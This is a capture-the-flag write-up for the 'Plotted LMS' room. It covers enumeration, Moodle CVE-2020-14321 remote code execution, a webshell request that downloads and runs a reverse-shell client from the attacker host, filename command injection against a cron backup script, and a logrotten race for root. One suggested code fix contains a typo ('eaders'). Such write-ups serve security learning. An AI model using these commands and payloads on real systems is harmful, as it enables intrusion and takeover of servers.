# Plotted LMS

A fairly hard room, largely due to the breadth of the enumeration and its numerous rabbit holes, plus some instability mixed with dickery in the foothold path.

1. A rust scan reveals four websites, 80, 873, 8820 and 9020. All show a default apache page
2. Using ffuf with directory wordlist medium on each, it reveals three sites: :873/rail, :8820/learn and :9020/moodle. The first two look to be custom built, but the last is a regular moodle instance.
3. Running moodlescan against the moodle url, reveals it is version 3.9 beta. This version is vulnerable to CVE-2020-14321, a authenticated remote code execution vulnerability.
4. The vuln requires the creds or cookie of a 'teacher'. Fortunately the site allows registeration, so I register a `test123:Test-123` user. Furthermore, there is a course 'teachers only' that allows self-enrollment, making the new user a teacher.

> The next bit was tricky. It took me four instances of the target VM and a lot of dickery to get the exploit working. Part of it was the author's countermeasures: any request without a referer header would respond with a rickroll message, breaking the script. But aside from that, the exploit itself seemed dependent on a very specific state - any messing about with moodle as I did trying to debug or enumerate would break the script flow, very annoying. In the end, the exact steps described following worked somewhat consistently.

5. On exploit-db, there is a reference impl for this vuln: https://www.exploit-db.com/exploits/50180. Instead of using that directly, I used the original repo referenced: https://github.com/HoangKien1020/CVE-2020-14321
6. Before running, this needs to be modified:
    - on line 9, this line: `headers={"Content-Type":"application/x-www-form-urlencoded"}` should be expanded to include a referer value, e.g. `headers={"Content-Type":"application/x-www-form-urlencoded","Referer": "http://10.10.94.67:9020/moodle/"}`
    - there are two uses of `session.get` in the script that dont specify headers, e.g. line 27~: `r=session.get(login_url,proxies=proxies)`. This should be changed to add the headers variable, e.g. `r=session.get(login_url,proxies=proxies,eaders=headers)`.
7. Running the script like so will hopefully result in output like the following:

    ```bash
    root@ip-10-10-242-204:~# python3 ./cve202014321.py -url http://10.10.94.67:9020/moodle -u test123 -p Test-123 -cmd=ls
                             ***CVE 2020 14321***
        How to use this PoC script
        Case 1. If you have vaid credentials:
        python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd=dir
        Case 2. If you have valid cookie:
        python3 cve202014321.py -u http://test.local:8080 -cookie=37ov37abn9kv22gj7enred9bl7 -cmd=dir

    [+] Your target: http://10.10.94.67:9020/moodle
    [+] Logging in to teacher
    [+] Teacher logins successfully!
    [+] Privilege Escalation To Manager in the course Done!
    [+] Maybe RCE via install plugins!
    [+] Checking RCE ...
    [+] RCE link in here:
    http://10.10.94.67:9020/moodle/blocks/rce/lang/en/block_rce.php?cmd=ls
    block_rce.php

    ```
    
8. with the new webshell we can get a strong reverse shell. I used https://github.com/NHAS/reverse_ssh to get a full shell as www-data. E.g., via the following path (with the ip of my attack box and webserver port in there:

    ```
    GET /moodle/blocks/rce/lang/en/block_rce.php?cmd=wget+10.10.132.8%3a1234/client+%26%26+chmod+%2bx+client+%26%26+./client+%26 HTTP/1.1
    ```

10. To pivot to the `plot_admin` user, there is a cronjob that runs every minute, executing a script called backup.py in the plot_admin user's home directory. The contents of this script are:

    ```python
    import os

    moodle_location = "/var/www/uploadedfiles/filedir/"
    backup_location = "/home/plot_admin/.moodle_backup/"

    os.system("/usr/bin/rm -rf " + backup_location + "*")

    for (root,dirs,files) in os.walk(moodle_location):
            for file in files:
                    os.system('/usr/bin/cp "' + root + '/' + file + '" ' + backup_location)
    ```
    
10. To exploit this, as we have write into `/var/www/uploadedfiles/filedir/`, we can create a file in there like `$(chmod 777 backup.py)`. This can be done with `touch \$\(chmod\ 777\ backup.py\)` in that folder. Within a minute, the backup file will be writable by our user.
11. Next, adding `os.system("/var/www/9020/moodle/blocks/rce/lang/en/client")` into backup.py (after removing the chmod file above, as it breaks the script) will get a reverse shell as plot_admin. Note this is using the reverse_ssh client I downloaded with the webshell.

> The following root privesc seemed *real* flaky, and I tried over multiple restarts to get it to work, only persisting once I checked and my approach *is* intended. So, just be aware that this might require a few goes. Best bet I've found is to get in there quick - I've had it work semi-seamlessly if I'm running logrotate 10 minutes after machine boot.

13. Careful enumeration or using pspy will reveal logrotate is being used with a custom config file at `/etc/logbackup.cfg`. The contents of this are:

    ```
    /home/plot_admin/.logs_backup/moodle_access {
        hourly
        missingok
        rotate 50
        create
    }
    ```
    
14. This suggests a [logrotten](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition) vulnerability, since we control that directory as plot_admin. Basically we can swap out the file being created/updated due to a race condition, plonk a payload into bash completion, and when the root user logs in they will trigger the payload and grant us a shell. Enumeration shows we don't have to wait - the root user is executing what they find in bash completion on a schedule.
15. To abuse this, I used https://github.com/whotwagner/logrotten. My payload file triggered a reverse_ssh client. In order to trigger the log rotate, you need to modify the moodle_access backup file - this can all be done in a few lines like so (run from plotadmin's home folder, where client and logrotten (compiled) have been placed:

    ```
    echo 'if [ `id -u` -eq 0 ]; then (/home/plot_admin/client &); fi' > payloadfile
    cp .logs_backup/02.06.2022 .logs_backup/moodle_access; ./logrotten -p payloadfile -d /home/plot_admin/.logs_backup/moodle_access
    ```
17. And after a few minutes (or rather, five or so restarts and many hours of waiting) boom root!
